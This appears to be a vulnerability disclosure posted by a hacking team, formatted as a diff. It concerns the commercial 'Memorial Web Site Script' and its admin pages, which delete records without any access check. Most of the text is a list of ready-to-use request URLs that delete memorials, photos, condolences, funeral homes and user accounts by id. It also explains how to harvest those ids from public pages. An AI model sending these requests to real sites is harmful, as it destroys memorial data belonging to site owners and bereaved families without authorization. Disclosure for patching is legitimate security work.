@@ -1,0 +1,94 @@
+-----------------------------------------------------------------------------------------
+Memorial Web Site Script Multiple Arbitrary Delete Vuln
+-----------------------------------------------------------------------------------------
+ 
+Author	: Chip D3 Bi0s
+Email	: chipdebios[alt+64]gmail.com
+Where	: From Remote
+Team	: LatinHackTeam
+
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Author	: Easy Scripts
+Price	: $49
+Vendor	: http://www.easy-scripts.net
+
+description Bug:
+~~~~~~~~~~~~~~~
+After seeing the bug v3n0m:
+http://www.exploit-db.com/exploits/12351
+
+I kept seeing some things,
+Discovery that could clear things published registered user,
+even delete registered users:)
+to do so, we must first get the id of registered users
+I'd have this form in some of its publications
+
+http://127.0.0.1/[path]/show_memorial.php?id=100
+
+
+then only get the id can delete all these things
+Memorials, Pictures, Multimple Pictures, Condoleances,
+Funeral homes, Resell & Delet Users
+
+All this is explained below:
+
+
+-------------------
+Delet Memorials
+http://127.0.0.1/[path]/admin/delete_mem.php?id=100
+
+------------------
+Delet Pictures
+http://127.0.0.1/[path]/admin/delete_pic.php?id=100
+
+
+
+in case of multiple images
+View Source on the pole is thus
+
+var preloadedimages=new Array();
+var timeoutId;
+
+photos[0]="pictures/1158372383_0_sub.JPG";
+names[0]="";
+photos[1]="pictures/1158372858_0_sub.JPG";
+names[1]="Mon&Dad";
+photos[2]="pictures/1158372975_0_sub.JPG";
+names[2]="Cementry";
+photos[3]="pictures/1158373106_0_sub.JPG";
+names[3]="Dad&Tommy";
+photos[4]="pictures/1158373106_1_sub.JPG";
+names[4]="Dad&Steve";
+photos[5]="pictures/1158373335_0_sub.JPG";
+names[5]="";
+photos[6]="pictures/1158375471_0_sub.JPG";
+names[6]="Dad7Minoo&Homa";
+
+Delet Multimple Pictures
+
+http://127.0.0.1/[path]/admin/del_im.php?id=100&name=1158375471_0_sub.JPG
+-------------------
+
+Delet Condoleances
+http://127.0.0.1/[path]/dmin/delete_con.php?id=100
+
+-------------
+Delet Funeral homes
+http://127.0.0.1/[path]/admin/delete_fh.php?id=100
+
+
+--------
+Delet Resell
+http://127.0.0.1/[path]/admin/delete_resell.php?id=100
+
+---------
+Delet Users
+http://127.0.0.1/[path]/admin/delete_user.php?id=100
+
+
+
++++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
